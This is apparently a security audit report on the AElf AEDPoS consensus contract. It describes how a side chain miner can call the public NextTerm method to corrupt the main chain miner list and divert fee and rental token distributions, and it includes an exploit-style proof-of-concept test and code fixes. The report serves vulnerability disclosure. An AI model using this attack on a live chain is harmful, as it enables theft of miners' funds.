# Audit Report

## Title
Side Chain Miner Can Manually Call NextTerm to Corrupt MainChainCurrentMinerList and Steal Resource Token Distributions

## Summary
A side chain miner can directly invoke the public `NextTerm` method with a crafted `NextTermInput` containing side chain miner addresses, bypassing the intended consensus flow. This corrupts `State.MainChainCurrentMinerList` with side chain miners, causing subsequent `UpdateInformationFromCrossChain` calls to distribute accumulated resource tokens (transaction fees and rental fees) to side chain miners instead of the intended main chain miners.

## Finding Description

The vulnerability stems from a missing authorization check in the `SetMinerList` method despite a comment indicating it should be restricted.

**Root Cause - Missing IsMainChain Check:**

The `SetMinerList` method has a comment stating "Only Main Chain can perform this action" but lacks enforcement: [1](#0-0) 

Line 76 unconditionally overwrites `State.MainChainCurrentMinerList.Value` regardless of chain type.

**Attack Execution Path:**

1. While side chains normally use `NextRound` behavior (never `NextTerm`): [2](#0-1) 

2. The `NextTerm` method is still publicly accessible: [3](#0-2) 

3. A side chain miner crafts `NextTermInput` with side chain miners in `RealTimeMinersInformation` and calls `NextTerm` directly.

4. The `PreCheck` validation only verifies the caller is in the current/previous miner list, not which method is appropriate: [4](#0-3) 

5. `ProcessNextTerm` extracts miners from the input and calls `SetMinerList`: [5](#0-4) 

6. This corrupts `State.MainChainCurrentMinerList` with side chain miners.

7. When `UpdateInformationFromCrossChain` is subsequently called, it distributes tokens to the corrupted list BEFORE updating it with correct main chain miners: [6](#0-5) 

8. The distribution function uses the corrupted miner list: [7](#0-6) 

Line 72 retrieves the corrupted list, and lines 84-94 distribute all accumulated tokens to side chain miners instead of main chain miners.

## Impact Explanation

**Direct Fund Theft:**
The vulnerability enables direct theft of accumulated resource tokens (transaction fees from `PayTxFeeSymbolListName` and rental fees from `PayRentalSymbolListName`) that should compensate main chain miners for securing the network and enabling cross-chain functionality.

**Quantified Loss:**
- **Amount:** 100% of resource tokens held in the side chain's consensus contract (`Context.Self`) at time of attack
- **Frequency:** Can be executed whenever resource tokens have accumulated (normal operation)
- **Victims:** Main chain miners lose their entire expected distribution from that side chain

**Protocol Impact:**
Breaks the cross-chain economic model where main chain miners are compensated for securing side chains, undermining the incentive structure for multi-chain operation.

## Likelihood Explanation

**High Likelihood:**

1. **Attacker Profile:** Any legitimate side chain miner (no special privileges required beyond being in the miner set)

2. **Attack Simplicity:** 
   - Craft a `NextTermInput` with `TermNumber = currentTerm + 1`, `RoundNumber = currentRound + 1`, and side chain miner addresses
   - Call the public `NextTerm` method
   - No complex timing or transaction ordering required

3. **Low Cost:** Only requires normal transaction fee for calling `NextTerm`

4. **No Detection:** Uses legitimate consensus method call that passes all existing validations

5. **High Reward:** Captures all accumulated resource tokens with no risk of reversion

**Note:** While calling `NextTerm` may disrupt the side chain's own consensus state (updating `CurrentTermNumber` and `CurrentRoundNumber`), this doesn't prevent the fund theft or reduce the vulnerability's severity.

## Recommendation

Add an `IsMainChain` check in `SetMinerList` to match the comment's intent:

```csharp
private bool SetMinerList(MinerList minerList, long termNumber, bool gonnaReplaceSomeone = false)
{
    // Enforce: Only Main Chain can update MainChainCurrentMinerList via this method
    Assert(State.IsMainChain.Value, "Only main chain can call SetMinerList");
    
    var minerListFromState = State.MinerListMap[termNumber];
    if (gonnaReplaceSomeone || minerListFromState == null)
    {
        State.MainChainCurrentMinerList.Value = minerList;
        State.MinerListMap[termNumber] = minerList;
        return true;
    }
    return false;
}
```

Alternatively, add validation in `ProcessNextTerm` to prevent side chains from executing term transitions:

```csharp
private void ProcessNextTerm(NextTermInput input)
{
    Assert(State.IsMainChain.Value, "Side chains cannot process NextTerm");
    // ... rest of method
}
```

## Proof of Concept

```csharp
// Test: SideChainMinerStealsResourceTokens
// Setup: Side chain initialized with MainChainCurrentMinerList containing main chain miners
// and accumulated resource tokens in consensus contract

public async Task SideChainMinerCanCorruptMainChainMinerList()
{
    // Given: Side chain with correct main chain miner list
    var mainChainMiners = new[] { "mainMiner1", "mainMiner2" };
    var sideChainMiner = "sideChainMiner1";
    
    // And: Resource tokens accumulated in side chain consensus contract
    await TokenContractStub.Transfer.SendAsync(new TransferInput
    {
        To = ConsensusContractAddress,
        Symbol = "ELF",
        Amount = 1000_00000000
    });
    
    // When: Side chain miner calls NextTerm with crafted input
    var currentTerm = await ConsensusContractStub.GetCurrentTermNumber.CallAsync(new Empty());
    var currentRound = await ConsensusContractStub.GetCurrentRoundNumber.CallAsync(new Empty());
    
    var maliciousInput = new NextTermInput
    {
        TermNumber = currentTerm.Value + 1,
        RoundNumber = currentRound.Value + 1,
        RealTimeMinersInformation = {
            { sideChainMiner, new MinerInRound { Pubkey = sideChainMiner, Order = 1 } }
        }
    };
    
    await ConsensusContractStub.NextTerm.SendAsync(maliciousInput);
    
    // Then: MainChainCurrentMinerList is corrupted with side chain miner
    var minerList = await ConsensusContractStub.GetMainChainCurrentMinerList.CallAsync(new Empty());
    minerList.Pubkeys.ShouldContain(ByteStringHelper.FromHexString(sideChainMiner));
    
    // When: UpdateInformationFromCrossChain is called
    await CrossChainContractStub.UpdateConsensusInformation.SendAsync(mainChainConsensusInfo);
    
    // Then: Tokens are distributed to side chain miner instead of main chain miners
    var sideChainMinerBalance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(sideChainMiner)),
        Symbol = "ELF"
    });
    
    sideChainMinerBalance.Balance.ShouldBeGreaterThan(0); // Side chain miner received stolen tokens
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L13-18)
```csharp
    public override Empty NextTerm(NextTermInput input)
    {
        SupplyCurrentRoundInformation();
        ProcessConsensusInformation(input);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_NextTerm.cs (L63-82)
```csharp
    /// <summary>
    ///     Only Main Chain can perform this action.
    /// </summary>
    /// <param name="minerList"></param>
    /// <param name="termNumber"></param>
    /// <param name="gonnaReplaceSomeone"></param>
    /// <returns></returns>
    private bool SetMinerList(MinerList minerList, long termNumber, bool gonnaReplaceSomeone = false)
    {
        // Miners for one specific term should only update once.
        var minerListFromState = State.MinerListMap[termNumber];
        if (gonnaReplaceSomeone || minerListFromState == null)
        {
            State.MainChainCurrentMinerList.Value = minerList;
            State.MinerListMap[termNumber] = minerList;
            return true;
        }

        return false;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusCommandGeneration/SideChainConsensusBehaviourProvider.cs (L16-23)
```csharp
        /// <summary>
        ///     Simply return NEXT_ROUND for side chain.
        /// </summary>
        /// <returns></returns>
        protected override AElfConsensusBehaviour GetConsensusBehaviourToTerminateCurrentRound()
        {
            return AElfConsensusBehaviour.NextRound;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L188-190)
```csharp
        var miners = new MinerList();
        miners.Pubkeys.AddRange(nextRound.RealTimeMinersInformation.Keys.Select(k => ByteStringHelper.FromHexString(k)));
        if (!SetMinerList(miners, nextRound.TermNumber)) Assert(false, "Failed to update miner list.");
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L316-331)
```csharp
    private bool PreCheck()
    {
        TryToGetCurrentRoundInformation(out var currentRound);
        TryToGetPreviousRoundInformation(out var previousRound);

        _processingBlockMinerPubkey = Context.RecoverPublicKey().ToHex();

        // Though we've already prevented related transactions from inserting to the transaction pool
        // via ConstrainedAEDPoSTransactionValidationProvider,
        // this kind of permission check is still useful.
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;

        return true;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ACS11_CrossChainInformationProvider.cs (L53-61)
```csharp
        DistributeResourceTokensToPreviousMiners();

        State.MainChainRoundNumber.Value = consensusInformation.Round.RoundNumber;

        var minersKeys = consensusInformation.Round.RealTimeMinersInformation.Keys;
        State.MainChainCurrentMinerList.Value = new MinerList
        {
            Pubkeys = { minersKeys.Select(k => ByteStringHelper.FromHexString(k)) }
        };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ACS11_CrossChainInformationProvider.cs (L66-96)
```csharp
    private void DistributeResourceTokensToPreviousMiners()
    {
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        var minerList = State.MainChainCurrentMinerList.Value.Pubkeys;
        foreach (var symbol in Context.Variables.GetStringArray(AEDPoSContractConstants.PayTxFeeSymbolListName)
                     .Union(Context.Variables.GetStringArray(AEDPoSContractConstants.PayRentalSymbolListName)))
        {
            var balance = State.TokenContract.GetBalance.Call(new GetBalanceInput
            {
                Owner = Context.Self,
                Symbol = symbol
            }).Balance;
            var amount = balance.Div(minerList.Count);
            Context.LogDebug(() => $"Consensus Contract {symbol} balance: {balance}. Every miner can get {amount}");
            if (amount <= 0) continue;
            foreach (var pubkey in minerList)
            {
                var address = Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey.ToHex()));
                Context.LogDebug(() => $"Will send {amount} {symbol}s to {pubkey}");
                State.TokenContract.Transfer.Send(new TransferInput
                {
                    To = address,
                    Amount = amount,
                    Symbol = symbol
                });
            }
        }
    }
```
